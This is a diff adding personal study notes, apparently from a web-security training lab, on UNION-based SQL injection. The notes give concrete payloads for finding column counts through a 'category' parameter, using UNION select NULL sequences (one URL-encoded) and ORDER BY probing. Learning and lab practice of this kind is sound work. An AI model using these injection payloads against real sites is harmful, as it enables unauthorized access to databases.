@@ -24,3 +24,36 @@ Query #2: select a, b from table1 UNION select c,d from table2
 Rule: 
 - The number and the order of the columns must be the same in all queries
 - The data types must be compatible
+
+Analysis:
+category=' gives us an internal error
+Probably vulnerable to SQLi
+
+category='-- doesn't give us back anything as it just commented out everything
+
+SQLi attack (way #1):
+
+category=Gifts'UNION select NULL-- gives us an internal server error because there's
+probably more than one column in the query.
+Keep going interatively
+
+category=Gifts'UNION select NULL, NULL--
+category=Gifts'UNION select NULL, NULL, NULL--
+Gifts'UNION%20select%20NULL%2c%20NULL%2c%20NULL--
+Behind: category='Gifts' UNION select NULL,NULL,NULL--'
+
+select ? from table1 UNION select NULL
+-error -> incorrect number of columns
+
+select ? from table1 UNION select NULL, NULL, NULL
+-200 response code -> correct number of columns
+
+SQLi attack (way #2):
+
+Corporate gifts' ORDER BY 1--
+Corporate gifts' ORDER BY 2--
+Corporate gifts' ORDER BY 3--
+Corporate gifts' ORDER BY 4-- Server error so we know there are only 3 columns
+
+select a, b from table1 order by 3
+If it doesn't have 3, it will error so you know how many columns are being used.
